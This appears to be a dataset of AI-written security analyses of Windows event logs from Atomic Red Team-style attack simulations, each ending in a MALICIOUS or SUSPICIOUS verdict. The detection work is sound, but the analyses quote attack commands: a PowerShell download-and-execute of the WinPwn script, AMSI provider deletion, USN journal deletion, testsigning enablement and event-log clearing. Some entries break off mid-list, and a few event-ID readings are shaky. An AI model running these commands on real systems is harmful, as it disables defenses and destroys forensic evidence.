4. **System Restoration and Hardening**: After analysis, restore systems to known good configurations. Implement additional security controls and monitoring to detect and prevent similar activities in the future.

### Final Resolution:
- **MALICIOUS**: The logs indicate clear signs of potential malicious activity due to the presence of file and log clearances, system reconnaissance, and unauthorized registry changes."

   - The logs indicate the execution of `wevtutil.exe` with command-line arguments to clear multiple Windows logs, specifically targeting ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", and ""Windows PowerShell"" logs. This activity was conducted by the user `admin_test` on the host `Server002`.
   - Security logs were also cleared as evidenced by the Event ID 1102 in the security event logs. The clearing of logs, especially security and Sysmon logs, is a known tactic used by malicious actors to cover their tracks post-compromise.

2. **Registry Modification:**
   - A command was executed through `cmd.exe` to alter a registry key related to Windows Update settings: `HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU` with a specific value set to prevent automatic reboots with logged-on users. While this is a known benign administrative action, conducted on its own, it may also be used by attackers to ensure persistence without interruptions.

3. **Process Execution:**
   - There were multiple instances of `wevtutil.exe` and `conhost.exe` running in close succession with high integrity levels. While `conhost.exe` being spawned by `wevtutil.exe` can be normal, in this context, the frequency and reason (log clearance) make it suspicious.
   - Another noteworthy process is the `whoami.exe` which could be indicative of an attacker gathering information about the logged-in user.

4. **Time Manipulation:**
   - There are entries indicating the system time was altered. While time synchronization is normal in server operations, it's critical to note this event due to timestamps associated with log clearance activities.

5. **Potentially Legitimate EdgeUpdate Activity:**
   - The execution of `MicrosoftEdgeUpdate.exe` processes appears consistent with legitimate update processes for Microsoft Edge. They show correct signatures and system-level execution, which by itself isn't indicative of malicious activity but should be noted for completeness.

**Assessment:**

Based on the analysis, there are several red flags indicative of potentially malicious activity:
- **Clearing of multiple logs** (Sysmon, application, system, PowerShell) is a strong indicator of an attempt to hide malicious actions.
- **Attempt to prevent system reboots** can be a tactic to avoid detection post-compromise.
- **Gathering user information** with `whoami.exe`.
- **Consistent high integrity privilege level** operations in tandem with the events above suggest a probable compromise.

**Resolution:**
- **MALICIOUS**: The activities observed, especially the clearance of logs and registry modifications, fit the profile of a compromised system attempting to cover tracks and ensure persistence. Immediate action is necessary, such as isolating the system, conducting a thorough incident response, and performing a complete environment review for other potential compromises.

**Guidance on How to Proceed:**
1. **Isolate the affected host (Server002)** from the network to prevent further potential attacker access.
2. **Conduct a comprehensive forensic investigation** to determine the full extent of the compromise, identifying any external access points or malware persistence.
3. **Review linked accounts and privileges** to ensure no other accounts are compromised or have excessive permissions.
4. **Audit and monitor remaining systems** in the network for similar patterns of anomalous activity.
5. **Strengthen log monitoring**, and implement more robust logging policies to detect similar actions quicker in the future.
6. **Coordinate a security briefing** with stakeholders to discuss findings, changes in security posture, and how to prevent future occurrences."
Windows HideSCANetwork Group Policy Feature,"### Detailed Log Analysis

#### Sysmon Log Analysis:
1. **Process Execution**:
   - Frequent executions of `MicrosoftEdgeUpdate.exe` under the `NT AUTHORITY\SYSTEM` context indicate legitimate background processes for updating Microsoft Edge. Versions and paths match typical update behaviors.
   - However, multiple instances of `cmd.exe` and `reg.exe` with command lines related to registry modifications (`HideSCANetwork`) executed by `SERVER002\admin_test` are concerning. This registry modification is not commonly performed and could indicate potential tampering.
   - The execution of `wevtutil.exe` by `SERVER002\admin_test` to clear logs (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`) suggests an attempt to hide activities.

2. **Security and System Log Clearing Events**:
   - The EventID `1102` in the Security log indicates log clearing by `admin_test`, which is a significant indicator of potential malicious activity, as attackers often clear logs to erase traces of their actions.
   - The System log also shows multiple clear events (`EventID 104`), again by the `admin_test` user. 

#### Security Log Analysis:
- **Log Clearing**: The presence of EventID `1102` correlates with the Sysmon execution of `wevtutil.exe` to clear logs, confirming deliberate log manipulation. 

#### System Log Analysis:
- **Log Clearing**: Repeated EventID `104` entries align with the actions described in the Sysmon log usage of `wevtutil.exe`. These actions were executed by `admin_test`, reinforcing the indication of an attempt to cover up activities.

#### Application and PowerShell Log Analysis:
- **Application Log**: The event of the ""Service stopped"" for the Edge update service is normal, as services often start and stop during update procedures.
- **PowerShell Log**: No logs were provided for the PowerShell operations, which should be reviewed if present, given the high-level activities noted.

### Assessment and Resolution

Based on the events analyzed:
- The use of `wevtutil.exe` to clear logs by an admin account (`admin_test`).
- Execution of suspicious registry modifications through `cmd.exe` and `reg.exe`.
- The clearing of multiple logs points strongly towards obfuscation tactics, typically used post-compromise.

**Overall Resolution**: **MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Actions**:
   - Isolate the affected host (Server002) from the network.
   - Begin incident response protocols to investigate and contain any potential threat actor presence.
   
2. **Forensics**:

Execution from Compressed File,"Upon reviewing the provided Windows event logs, several activities exhibit suspicious behavior that suggests potential malicious activity. Here is a detailed analysis:

### Indicators of Suspicious Activity:

1. **PowerShell Activity (Sysmon Log, EventID: 5, Process: PowerShell)**
   - Entry shows PowerShell execution by the user `admin_test`. PowerShell is a powerful tool often used by attackers for malicious purposes due to its extensive capabilities. However, there isn't enough detail on the command executed.
   - **Note:** Legitimate administrative tasks could also use PowerShell.

2. **Log Clearing (Security and System Logs, EventID: 1102 and 104)**
   - Security and system logs were cleared by `SERVER002\admin_test`. Clearing logs is a common tactic used post-compromise to cover tracks.
   - The specific use of `wevtutil.exe` by the user implies intentional log clearing, not a routine activity.

3. **Execution of Unidentified Executables (Sysmon Log, Process: T1027.exe)**
   - The process `T1027.exe` was executed from a temporary directory, often a red flag as adversaries use temp directories to execute payloads.
   - This executable isn't well-known and it executed a Windows process (calc.exe), typical for testing payload execution.

4. **High-Integrity Level Execution (Multiple Entries in Sysmon Log)**
   - Various processes, including `conhost.exe` and custom processes like `T1027.exe`, were executed with high integrity. Executing with high privileges could indicate privilege escalation or exploitation attempts.

5. **Event Dumping Using `wevtutil.exe` (Sysmon Log, EventID: 1)**
   - Repeated use of `wevtutil.exe` by the same user (`admin_test`) suggests dumping or clearing of security-related logs, consistent with anti-forensics activities.

6. **Credential Access Attempts (Security Log, EventID: 5379)**
   - Multiple failed attempts were observed with `ReturnCode`: `3221226021`, indicating access attempts.
   - Indicates potential password spraying or credential dumping.

### Conclusion and Recommendation:

Based on the analysis, there is sufficient evidence to categorize these logs as **MALICIOUS**:

1. The combination of PowerShell usage, log clearing activities, use of `wevtutil.exe` for suspicious purposes, and execution of non-standard executables align with typical adversary behavior.
2. Immediate attention is required to contain and remediate the suspected compromise.

### Next Steps:

1. **Isolate the Host:** Disconnect `Server002` from the network to prevent data exfiltration or lateral movement.
2. **Conduct Thorough Investigation:** Review endpoints for other signs of compromise, particularly any unauthorized access or unusual network activities.
3. **Contain and Eradicate:**
   - Remove unauthorized executables.
   - Flush and reset all credentials, especially for `admin_test`.
   - Verify and restore log files for further forensic analysis.
4. **Implement Monitoring and Alerts:**
   - Set alerts for unusual PowerShell commands and log clearing.
   - Enable enhanced logging for suspicious process executions and user activity.
5. **Review and Patch:** Ensure all systems are up-to-date with security patches and harden system configurations.

"
Invoke HTML Application - JScript Engine with Inline Protocol Handler,"## Analysis of Windows Event Logs:

### Overview of Events:

1. **System Log:**
   - Multiple log entries for clearing event logs with ""admin_test"" account on `Server002`. This included clearing the System and Windows PowerShell logs.

2. **Sysmon Log:**
   - Repeated execution of `wevtutil.exe` to clear event logs under different sessions and logs (e.g., System, Security, Application, Windows PowerShell).
   - A unique PowerShell execution with the command `Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\\system32\\mshta.exe`.

3. **PowerShell Log:**
   - PowerShell activities initiated with a somewhat obscure command related to invoking HTML application using JScript and MSHTA.

4. **Security Log:**
   - Security logs were also cleared by the same user ""admin_test"".

### Suspicious Observations:

- **Log Clearing Activity:**
  - The log clearance, especially of multiple significant logs like System, PowerShell, and Security, is generally suspicious if not part of routine log management or maintenance activities. It obscures past activities, which is a tactic often used by adversaries to cover tracks.

- **Execution of `wevtutil.exe`:**
  - `wevtutil.exe` is a legitimate utility for clearing event logs but is often leveraged maliciously for the same obfuscation purposes mentioned above.

- **PowerShell Script Execution:**
  - The command executed seems to be crafting a PowerShell session with potentially obfuscated intentions `Invoke-ATHHTMLApplication`, which doesn't look like a common or legitimate administrative task. The use of `MSHTA` (Microsoft HTML Application host) is a known method for executing scripts or payloads that can bypass certain security controls, indicating a potential attempt at lateral movement or code execution.

### Conclusion:
The sequence of events points strongly toward malicious activity. The logs contain evidence of an attempt to clean and hide tracks by a user utilizing administrative privileges. The clearing of logs, especially when detailed and uncommon PowerShell commands are involved, typically indicates malicious intent. Additionally, the use of powerful Windows utilities like `wevtutil.exe` and scripting engines suggest an attempt to execute potentially harmful scripts or evade detection.

### Resolution:
- **MALICIOUS**: The combination of log clearing, suspicious command-line activity, and the potential use of scripting engines for evasion are clear indicators of malicious behavior.

### Recommendations:

Taking immediate action is crucial to mitigate any potential damage and understanding the extent of the compromise."
WinPwn - Kill the event log services for stealth,"Upon reviewing the provided Windows event logs, several points of interest indicate potential malicious activity:

1. **Event Log Clearing:**
   - The `Security log` contains an entry with Event ID `1102`, which indicates that the security event log was cleared by a user `admin_test`. This action is often associated with an attempt to cover tracks after unauthorized activities.
   - The `System log` shows events with Event ID `104`, also indicating that both the System and Windows PowerShell logs were cleared around the same time.

2. **Suspicious PowerShell Activity:**
   - In the `Sysmon log`, there is a PowerShell execution (`EventID 1`) with a command line that downloads and executes a script from an external URL using the `iex` (Invoke-Expression) command. The URL `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1` suggests execution of a script from a GitHub repository which is a known tool for pentesting and credential harvesting attempts.

3. **Process Execution Indicating Potential Lateral Movement:**
   - There are multiple process creation events involving `wevtutil.exe`, which is a command-line utility for managing event logs. The clearing of the Sysmon, Application, and Security logs, as seen, corresponds with the use of `wevtutil` suggesting it might have been used to remove records of potentially malicious activities.

4. **Privilege Level and User Context:**
   - Several of these actions, including PowerShell executions and event log clearings, were executed with high integrity levels and by a user with elevated privileges (`SERVER002\\admin_test`), which implies that the user account has administrative rights on the system.

5. **Potential Credential Harvesting:**
   - The execution of scripts from external sources using PowerShell can often indicate attempts to download and potentially execute scripts for malicious intents such as credential harvesting.

Given the outlined suspicious activities—such as log clearing, execution of potentially malicious PowerShell scripts, and use of elevated privileges—there is strong evidence of malicious intent.

### Resolution: MALICIOUS

**Assessment:**
The logs indicate a potential compromise of the system where there are clear attempts at conducting post-exploitation activities, possibly following an initial exploitation phase.

**Recommendations:**
- Immediate isolation of Server002 to prevent further spread of potential breaches.
- Conduct a thorough forensic analysis to gather more evidence and understand the scope of the compromise.
- Review and reset credentials of potentially affected accounts.
- Implement stricter security controls and monitoring to detect such activities in the future.
- Conduct a full review of security policies and ensure that event logs cannot be easily cleared without detection."
AMSI Bypass - Remove AMSI Provider Reg Key,"### Analysis of Windows Event Logs

#### **Suspicious or Anomalous Behavior**

1. **Log File Clearing Activity**:
   - Multiple entries in the System log (Event IDs 104) show that the subject user ""admin_test"" cleared logs for System, Windows PowerShell, and Security channels. This is captured in both the System and Security logs.
   - The use of `wevtutil.exe` (eventing command line utility) by the user ""admin_test"" to clear logs is evident from entries in the Sysmon log.

2. **PowerShell Command Execution**:
   - Several PowerShell logs show the execution of a script using a `Remove-Item` command to delete certain registry entries under `HKLM:\SOFTWARE\Microsoft\AMSI\Providers`. This is a clear attempt to remove or tamper with AMSI (Antimalware Scan Interface) Providers, which could indicate an attempt to bypass or disable security mechanisms in place.

3. **Process Execution Using High Integrity Levels**:
   - Several process executions (notably `powershell.exe`, `wevtutil.exe`, and `conhost.exe`) are running under high integrity levels which indicate that the user is operating with elevated privileges.
   - The removal of the registry value is executed with a command linked to the AMSI, an unusual action unless explicitly performed by a legitimate maintenance task or a known administrative routine.

4. **Edge Update Processes**:
   - Frequent Edge Update service and setup related activities could be either normal or potentially indicative of misuse, depending on context. However, there are no immediate indicators that these represent malicious activity beyond their expected operations.

#### **Indicators of Malicious Activity or Compromise**

- **The clearing of event logs** points towards an attempt to cover tracks, a common trait of malicious activity aimed at persistence or avoiding detection.
- **The execution of PowerShell scripts to manipulate registry entries associated with security features (AMSI)** is inherently suspicious as it could potentially disable security features, leading to malware propagation or stealth.

### Overall Assessment

Based on the evidence presented from the event logs:

- **Privilege Escalation & Log Clearing**: Commands clearly demonstrate access to elevated privileges to carry out actions such as log clearing and potentially malicious registry edits. This behavior does not correspond to typical system maintenance or user actions in a secure environment.
- **Risk of Security Bypass**: The PowerShell script aimed at modifying AMSI registry entries suggests a deliberate action to bypass security controls, further pointing towards a potential security compromise.

### Resolution

- **Resolution**: **MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Action**: Isolate the host (Server002) from the network to prevent further potential lateral movement by any malicious scripts or tools.
2. **Conduct a Full Forensic Investigation**:
   - Retrieve the timeline and context of all administrative actions around the period.
   - Analyze other endpoints in the network for similar signs of compromise.
   - Utilize endpoint detection and response (EDR) solutions to look for other potential indicators of compromise (IoCs).
3. **Review Security Controls**:
   - Strengthen logging and monitoring to detect similar activities promptly.
   - Ensure AMSI and other security mechanisms are intact and operating efficiently.
4. **Remediation**:
   - Reset credentials and review the user permissions for ""admin_test"" and other privileged accounts.
   - Patch and update the system to mitigate against known threats exploiting similar attack vectors.
5. **Training and Awareness**: Emphasize awareness and training programs for users, especially those with elevated privileges, to understand the significance of action logs and the risk of unauthorized commands.

By taking these steps, you'll leverage adherence to best practices for incident response and secure the environment against similar activities in the future."
Adding custom paths for application execution,"## Analysis of the Provided Windows Event Logs:

### Key Observations:
1. **Event Log Clearing:**
   - Multiple entries indicate the use of `wevtutil.exe` to clear event logs (`System`, `Windows PowerShell`, `Security`). This is highly suspicious and often indicative of an attempt to cover tracks after potentially malicious activity.
   - Event IDs 104 (for System and PowerShell logs) and 1102 (for Security logs) denote log file clearing operations.

2. **Usage of Suspicious Command Lines:**
   - **Command:** `""cmd.exe"" /c reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"" /t REG_SZ /d C:\Windows\System32\notepad.exe /f`
   - The modification to the registry path for `msedge.exe` to launch `notepad.exe` instead is a typical persistence or attack tactic where a benign executable is replaced to execute something else. This registrational manipulation is suspicious and could indicate attempted process redirection or persistence mechanism.

3. **Admin Privileges and Elevated Tokens:**
   - The user `admin_test` logged on using NTLM, received elevated privileges (Event ID 4672), which included `SeDebugPrivilege` and other sensitive rights. This combination of privileges can be exploited for further malicious activities such as process injection or stealth tool execution.

4. **Periodic System and Network Services:**
   - Logs such as `Microsoft-Windows-Security-Auditing` with logon and authorization details (Event ID 4624) show NTLM authentication logs.
   - Network services, such as the running of `MicrosoftEdgeUpdate.exe`, appear to be regular service updates and are generally expected behavior, though confirmation is needed to ensure integrity.

5. **Absence of PowerShell Logs:**
   - The Windows PowerShell log section is notably absent. Event clearing of PowerShell logs could be a tactic to obfuscate traces from scripts that might have been executed.

## Assessment:
Based on these observations, the provided logs contain activities that are **anomalous and potentially malicious**. The clearing of event logs, registry modification through `cmd.exe`, and the use of elevated privileges are significant indicators of a possible security incident or a compromised host.

## Guidance:
1. **Resolution: MALICIOUS**
   - Activities recorded are consistent with efforts to evade detection and maintain persistence in the system. Immediate containment and eradication steps should be taken.

2. **Immediate Actions:**
   - Conduct a full forensic investigation on the host `Server002`.
   - Isolate the host from the network to prevent potential spread or exfiltration.
   - Gather memory dumps and disk images for detailed analysis of any volatile artifacts.
   - Review all active user sessions, particularly focusing on the activities and access of `admin_test`.
   - Reset passwords and review account privileges for anomalies across all accounts, especially those with elevated permissions.

3. **Recommendation for Further Investigation:**
   - Scrutinize other systems connected to the same network segment for similar activity.
   - Enhance monitoring and alerting for similar `wevtutil.exe` usage and unauthorized registry changes.
   - Implement additional logging and continuous monitoring controls across the system for ensuring proactive detection of such incidents in the future. 

These steps should help in identifying any further compromise, securing the environment, and ensuring no residual threats persist."
Modify EnableBDEWithNoTPM Registry entry,"Upon reviewing the event logs from the provided Windows host, several entries stand out as potentially suspicious, suggesting further investigation is warranted. 

### Suspicious and Anomalous Behavior Identified:
1. **Log Clearing Events:**
   - The System and Windows PowerShell logs were cleared by the user `admin_test`. This is indicated by Event ID `104` in the System log and Event ID `1102` in the Security log. Log clearing is a common tactic used by malicious actors to cover their tracks.

2. **Command Line Executions:**
   - The use of `wevtutil.exe cl` in the Sysmon logs is indicative of log clearing. The command ""wevtutil.exe cl"" stands for clearing Windows event logs, and this action is repeated across various channels like Sysmon, Application, and System logs with high integrity level access.
   - Similarly, `cmd.exe` was used to add a registry entry via `""reg add \""HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f""`. This modifies security configuration related to BitLocker without a TPM, implying potential tampering with system security settings.

3. **Time Manipulation:**
   - Time configuration changes are logged (Security Event 4616), which might indicate an attempt to disorient logging or auditing processes. 

### Other Observations:
- The logs contain multiple entries related to `MicrosoftEdgeUpdate.exe` processes, which is legitimate software for updating Microsoft Edge. These do not inherently indicate malicious activity unless tied with other malicious indicators.
- Entries involving standard system processes like `svchost.exe` and `sppsvc.exe` show activity but without additional context do not appear malicious.

### Assessment:
Based on the analysis, the most concerning actions are the clearing of event logs and registry modifications. These actions are often associated with attempts to conceal unauthorized activity and potentially configure a system for further exploit. The presence of high integrity command executions and time manipulation increases the suspicion around these activities.

### Resolution:
**SUSPICIOUS**

### Guidance on How to Proceed:
1. **Immediate Investigation:**
   - Investigate the user account `admin_test` for any unauthorized access or abnormal behavior outside usual activity days and times.
   - Determine whether the clearing of logs was part of legitimate maintenance or a possible compromise action.

2. **System Security:**
   - Review the security policies and configurations to ensure no unauthorized changes have been made, particularly those related to TPM and BitLocker.
   - Review access control mechanisms and audit trails for any signs of unauthorized or escalated privileges.

3. **Contain and Monitor:**
   - Place enhanced monitoring on the system for any further suspicious actions.
   - Consider isolating the system for deeper forensic analysis to ascertain any presence of malicious code or persistence mechanisms.

4. **User Awareness:**
   - Conduct a review and reinforcement of security protocols among system administrators and potentially involved personnel.

The identified activities necessitate further investigation to confirm whether they are benign actions carried out by an authorized admin or signs of a security breach."
Code Signing Policy Modification,"The logs provided for analysis reveal a series of activities on the Windows host that warrant attention. The following key points summarize the most notable observations:

1. **Log Clearing Activities**:
    - The logs indicate that the `wevtutil.exe` command-line utility was utilized multiple times to clear Windows event logs, particularly targeting channels like ""System"", ""Application"", ""Security"", and ""Windows PowerShell"". This was executed by the user `SERVER002\admin_test` with a high integrity level, suggesting administrative privileges.
    - The security log explicitly shows event ID 1102, which indicates that the security log was cleared. This action is frequently associated with attempts to cover the tracks of malicious activities.

2. **Suspicious Process Execution**:
    - Several executions of `cmd.exe` with specific command-line arguments, especially `bcdedit /set testsigning on`, were observed. This command alters Windows boot configuration to allow unsigned drivers, which can be a technique used by attackers or testers to bypass standard driver signature enforcement.

3. **Frequent Use of System Utilities**:
    - High-frequency execution of system utilities like `wevtutil.exe`, `whoami.exe`, and `hostname.exe`, as well as multiple executions of `MicrosoftEdgeUpdate.exe`, suggest automated scripting or potential misuse.
  
4. **TimeChange Events**:
    - Event ID 4616 indicates time changes initialized by `svchost.exe`, performed by the `LOCAL SERVICE`. Consistent and intentional time changes can suggest attempts at timestamp manipulation in logs.

5. **High-Level Account Activity**:
    - The user `SERVER002\admin_test` repeatedly executed commands and processes at a high integrity level, suggesting the user account was likely executing actions with elevated privileges. This is a concern if the actions are unexpected or unauthorized.

6. **Microsoft Edge Updater Execution**:
    - Numerous instances of `MicrosoftEdgeUpdate.exe` processes initiated sequentially within short intervals. While this could be part of legitimate software update processes, the context with other log-clearing and command-line activities raises suspicion.

Given the evidence of log clearing, command executions that suggest privilege escalation, and potential attempts at obfuscation or concealment, the analysis concludes that the logs contain indicators of potential compromise.

### Resolution: MALICIOUS

**Guidance**:
- Isolate the affected system to prevent further potential damage or lateral movement.
- Perform a comprehensive malware analysis on the affected system, focusing on executable files, particularly those related to the suspicious processes.
- Conduct forensic analysis to investigate any unauthorized access or abnormal persistence mechanisms.
- Review and reinforce security measures, such as restricting usage of high-risk utilities (`wevtutil.exe`, `bcdedit.exe`) and ensuring proper logging and monitoring practices are in place.
- Evaluate the credibility of the affected user account activities to ensure it was not compromised. Consider resetting credentials and auditing user privileges."
Indicator Removal using FSUtil,"Upon analyzing the provided Windows event logs from the host labeled as `Server002`, I've identified several key events that raise suspicion and suggest potential malicious activity:

1. **Event Log Clearing:**
   - The `EventID 104` in the System log and `EventID 1102` in the Security log indicates that logs for various channels, including `System`, `Windows PowerShell`, and `Security`, were cleared by the user `admin_test`. This is a common tactic used by attackers to cover their tracks after performing malicious activities.

2. **Command Line Utility Execution:**
   - Multiple `Sysmon EventID 1` entries show the execution of `wevtutil.exe` with the `cl` command, which is used to clear logs from different log channels (`Application`, `Security`, `Windows PowerShell`). This closely aligns with the log-clearing events as mentioned above, and it's highly unusual to see legitimate activity requiring the clearing of logs.

3. **Use of `fsutil` Utility:**
   - The `Sysmon EventID 1` shows a command `cmd.exe /c fsutil usn deletejournal /D C:` executed by the user `admin_test`. The `fsutil usn deletejournal` command deletes the change journal, which stores changes to files, another possible attempt to hide evidence of unauthorized modifications or deletions on the filesystem.

4. **Presence of Obfuscated Usernames in Security Logs:**
   - Multiple `Security EventID 4798` indicate queries for several user accounts, including `Administrator`, `admin_test`, `DefaultAccount`, `Guest`, and `lplui`. While the activity isn't inherently suspicious, if seen in conjunction with the above suspicious behavior, it emphasizes potential reconnaissance or lateral movement attempts.

**Assessment:**
The combination of log clearing, use of utilities like `wevtutil` to clear logs, and `fsutil` to delete journal data indicates deliberate actions taken to cover tracks and potentially obscure malicious activity on the system. These actions strongly suggest an attempt to obfuscate system activities, which is a telltale sign of compromise.

**Resolution: MALICIOUS**

**Guidance:**
1. Immediately isolate `Server002` from the network to prevent further potential spread or exploitation.
2. Perform a comprehensive forensic analysis on this server to identify further evidence of intrusion.
3. Review recent changes and access permissions to confirm the extent of the intrusion.
4. Reset credentials for any suspiciously accessed accounts including `admin_test`.
5. Update and strengthen security measures on all related systems to prevent similar future incidents.
6. Conduct a full incident report and patch any identified vulnerabilities."
Disable Remote Desktop Security Settings Through Registry,"Based on the provided Windows event logs, here is a detailed analysis of suspicious or malicious activities:

1. **Log Cleared Events:**
   - **Event ID 1102 (Security Log Cleared):** This event indicates that the security log was cleared by the user `admin_test` from the computer `SERVER002`.
   - **Event ID 104 (System and Windows PowerShell Logs Cleared):** Similarly, these events indicate that the system and Windows PowerShell logs were cleared by the user `admin_test`.

   Log clearance, especially when done in quick succession and across multiple log types, is a highly suspicious activity often associated with malicious behavior, such as attempting to cover up unauthorized actions.

2. **Privilege Escalation Events:**
   - **Event ID 4672:** This event indicates that the user `admin_test` was granted special privileges, including `SeDebugPrivilege`, which is often used in malicious activities for privilege escalation.

3. **Time Change Event:**
   - **Event ID 4616 (Security Log):** There was a change in the system time by the `LOCAL SERVICE`. Altering system time can be indicative of an attempt to manipulate timestamps for logs, potentially to obscure the order or occurrence of certain events.

4. **Suspicious Command Execution:**
   - **Sysmon Event showing cmd.exe Execution:** The logs reveal the execution of `cmd.exe` with a command to modify the registry setting `DisableSecuritySettings`. This action is suspicious as it modifies terminal services policies and could be an attempt to weaken system security settings.

5. **Processes Spawned with High Integrity:**
   - Several instances of `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe` are noted. While these utilities are built into Windows, their rapid execution in succession, particularly `wevtutil.exe` used for clearing logs, raises concerns.

6. **Other Observations:**
   - Network logons using NTLM authentication from `DESKTOP-3HL5B2P`, and logons without elevated tokens might suggest access attempts from external machines or accounts.
   
**Assessment:**
The logs exhibit various signs consistent with malicious activity:
- Log files being cleared.
- Privilege escalation.
- Registry changes affecting security settings.
- System time alterations.

**Conclusion:**
- **Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Incident Response:**

WINWORD Remote Template Injection,"## Detailed Analysis:

### Indicators of Suspected Malicious Activity:

1. **Event Log Clearing:**
   - **Security Log Event 1102:** This event indicates that the security log was cleared by a user named ""admin_test"" using the process ID 6136.
   - **System Log Event 104:** Similar events were observed for the clearing of the System and Windows PowerShell logs. This is a crucial indicator of suspicious activity as attackers often clear logs to cover their tracks after malicious operations.

   *Assessment:* The clearing of event logs is highly suspicious because it can indicate an attempt to delete evidence of unauthorized or malicious activities.

2. **Process Execution and Command Line Arguments:**
   - Multiple instances of the `wevtutil.exe` command were executed to clear different logs (e.g., Sysmon, Application, System, Security). The usage of `wevtutil.exe` in this manner, especially under the context of being run by a standard user with high integrity level, further suggests malicious intent.
   - There are records of spawning processes like `cmd.exe` with seemingly innocuous command lines. However, executing `cmd.exe /c` to start unexpected files, like a `Calculator.docx` under a directory resembling a known attack simulation framework (""AtomicRedTeam""), could indicate testing or orchestrating internal compromise scenarios.

   *Assessment:* The use of `wevtutil.exe` to clear logs and `cmd.exe` to execute potentially unwanted operations, while could be legitimate in some administrative contexts, in combination with log clearing events, is highly suspicious.

3. **Usage of High-Integrity Processes:**
   - Observations of processes such as `HOSTNAME.EXE`, `whoami.exe`, and other common utilities like `wevtutil.exe` operating with a high integrity context, could indicate privilege misuse or be part of a reconnaissance phase within a network intrusion lifecycle.

   *Assessment:* Typically, these commands on their own are not harmful; however, in conjunction with other suspicious indicators, they deserve scrutiny.

### Potential Threats or Risks:

- **Privilege Misuse and Reconnaissance:** The execution of high-integrity processes suggests potential unauthorized access with administrator-like capabilities, aligning with an intruder's tactic of gaining more system context and coverage.
  
- **Evidence Tainting:** The clearing of logs significantly hampers the ability of forensic analysts to trace and piece together activities carried out on the host, thus increasing the difficulty of detecting and responding to potential incidents.

### Resolution:

Based on the corruption of logs through deliberate clearing and the suspicious series of executions, the observed behavior exhibits characteristics consistent with known adversarial tactics. 

- **Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Containment:**
   - Disconnect the affected system from the network to prevent further spread or data exfiltration.

2. **Detailed Investigation:**
   - Conduct a comprehensive forensic analysis to identify the extent of the compromise.
   - Examine any connected systems for similar indicators of compromise.

3. **Audit and Improve Security Controls:**
   - Review account activities for unauthorized access.
   - Implement stricter logging and monitoring to quickly identify and respond to such activities in the future.

4. **Communication:**
   - Inform relevant stakeholders about the potential security breach.
   - Report to appropriate authorities if data breach regulations apply.

5. **System Hardening:**
   - Apply all necessary patches and updates.
   - Evaluate and enforce strict access controls, especially for sensitive operations and data access.

This action plan will help mitigate the current risk and strengthen future security postures."

"
Disable Windows Notification Center,"Upon reviewing the provided Windows event logs, several patterns and activities were observed that may suggest suspicious or malicious behavior. Here is a breakdown of the assessment:

### Suspicious Behavior:
1. **Event Log Clearing**: 
   - There are multiple instances where the `wevtutil.exe` command is used with the `cl` (clear log) option on various channels (e.g., Sysmon Operational, Application, System, Security, Windows PowerShell).
   - For instance, the `EventID: 5` indicates the clearing of logs at various times, specifically by the user `SERVER002\admin_test` with high integrity level.

2. **Command Execution**:
   - The execution of potentially suspicious command lines using `cmd.exe` to modify registry settings:
     - Example: `cmd.exe /c reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f`
   - This involves modifying registry policies, which could potentially suppress system warnings or notifications.

3. **Repeated Commands**:
   - The frequent execution of `whoami.exe` and `hostname.exe` which could indicate reconnaissance activities to gather system and user information.

4. **System Time Changes**:
   - There are log entries indicating the system time being set back multiple times, which can be an evasion tactic to confuse logging and monitoring systems.
   - This activity was specifically observed in the Security and System logs (`EventID: 4616` and `EventID: 1`).

### Malicious Indicators:
- The log clearing and registry modifications combined with system time adjustments strongly suggest attempts to cover tracks and maintain persistence or evade detection.

### Conclusion:
Based on the evaluation of activities such as event log clearing, registry changes, system time modifications, and the process activities, the behavior observed in the logs is classified as **MALICIOUS**. These activities are indicative of potential malicious intent, aligning with tactics often used in compromises to evade detection and cover tracks.

### Recommendations:
1. **Immediate Containment**: Isolate the affected host, `Server002`, from the network to prevent any further potential actions.
2. **Forensic Imaging**: Create a forensic image of the system for detailed offline analysis and to preserve evidence.
3. **Log Review & Correlation**: Investigate other systems within the network for similar activities, focusing on log clearing and unauthorized registry modifications.
4. **User Account Monitoring**: Ensure that the user account `admin_test` is thoroughly audited and its credentials reset or disabled if not needed.
5. **Enhanced Monitoring**: Increase monitoring of the environment for similar patterns, and deploy behavioral detections to catch such log clearing and evasion techniques in the future.
6. **Review and Harden Policies**: Implement strict Group Policies to prevent unauthorized log clearing and registry changes, and ensure privileged accesses are logged and monitored."
UACME Bypass Method 59,"Upon analyzing the provided Windows event logs, several points of interest suggest potentially malicious activity. Let's break down key indicators:

### Anomalous Activities:

1. **Clearing of Event Logs:**
   - **System Log:** 
     - Event ID 104: The system log was cleared by the user `admin_test`.
   - **Security Log:** 
     - Event ID 1102: The security log was cleared by the same user.
   - These events suggest a possible attempt to cover tracks after performing potentially malicious activities, as clearing event logs is commonly associated with threat actors trying to eliminate forensic evidence.

2. **Execution of `cmd.exe` with Suspect Command Line:**
   - **Sysmon Log:** 
     - Execution of `cmd.exe` with a suspicious command: `""C:\Windows\system32\cmd.exe"" /c echo C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\uacme\59 Akagi64.exe`.
   - The command line indicates that a potentially harmful executable, `Akagi64.exe`, may be prepared for execution. This executable is linked to UACME, a known tool for User Account Control (UAC) bypassing techniques.

3. **Usage of `wevtutil.exe` to Clear Logs:**
   - **Sysmon Log:** 
     - Multiple entries show `wevtutil.exe` being utilized to clear Windows event logs (`Sysmon`, `Application`, `System`, `Security`, `Windows PowerShell` channels). 
